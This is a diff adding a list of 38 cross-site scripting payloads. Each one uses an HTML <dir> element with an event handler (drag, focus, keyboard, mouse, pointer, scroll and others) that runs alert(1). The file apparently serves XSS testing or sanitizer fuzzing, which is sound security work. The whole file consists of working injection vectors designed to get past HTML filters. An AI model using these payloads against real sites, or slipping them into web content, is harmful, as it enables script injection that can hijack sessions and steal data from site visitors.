@@ -1,0 +1,38 @@
+<dir contenteditable onbeforeinput=alert(1)>test
+<dir draggable="true" ondrag="alert(1)" style=display:block>test</dir>
+<dir draggable="true" ondragend="alert(1)" style=display:block>test</dir>
+<dir draggable="true" ondragenter="alert(1)" style=display:block>test</dir>
+<dir draggable="true" ondragleave="alert(1)" style=display:block>test</dir>
+<dir draggable="true" ondragstart="alert(1)" style=display:block>test</dir>
+<dir id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></dir>
+<dir id=x tabindex=1 onfocus=alert(1)></dir>
+<dir id=x tabindex=1 onfocusin=alert(1)></dir>
+<dir onafterscriptexecute=alert(1)><script>1</script>
+<dir onbeforescriptexecute=alert(1)><script>1</script>
+<dir onblur=alert(1) id=x tabindex=1 style=display:block>test</dir><input value=clickme>
+<dir onclick="alert(1)" style=display:block>test</dir>
+<dir oncontextmenu="alert(1)" style=display:block>test</dir>
+<dir oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<dir oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<dir ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</dir>
+<dir onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dir><input value=clickme>
+<dir onkeydown="alert(1)" contenteditable style=display:block>test</dir>
+<dir onkeypress="alert(1)" contenteditable style=display:block>test</dir>
+<dir onkeyup="alert(1)" contenteditable style=display:block>test</dir>
+<dir onmousedown="alert(1)" style=display:block>test</dir>
+<dir onmouseenter="alert(1)" style=display:block>test</dir>
+<dir onmouseleave="alert(1)" style=display:block>test</dir>
+<dir onmousemove="alert(1)" style=display:block>test</dir>
+<dir onmouseout="alert(1)" style=display:block>test</dir>
+<dir onmouseover="alert(1)" style=display:block>test</dir>
+<dir onmouseup="alert(1)" style=display:block>test</dir>
+<dir onmousewheel=alert(1) style=display:block>requires scrolling
+<dir onpointerdown=alert(1) style=display:block>XSS</dir>
+<dir onpointerenter=alert(1) style=display:block>XSS</dir>
+<dir onpointerleave=alert(1) style=display:block>XSS</dir>
+<dir onpointermove=alert(1) style=display:block>XSS</dir>
+<dir onpointerout=alert(1) style=display:block>XSS</dir>
+<dir onpointerover=alert(1) style=display:block>XSS</dir>
+<dir onpointerrawupdate=alert(1) style=display:block>XSS</dir>
+<dir onpointerup=alert(1) style=display:block>XSS</dir>
+<dir onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dir>
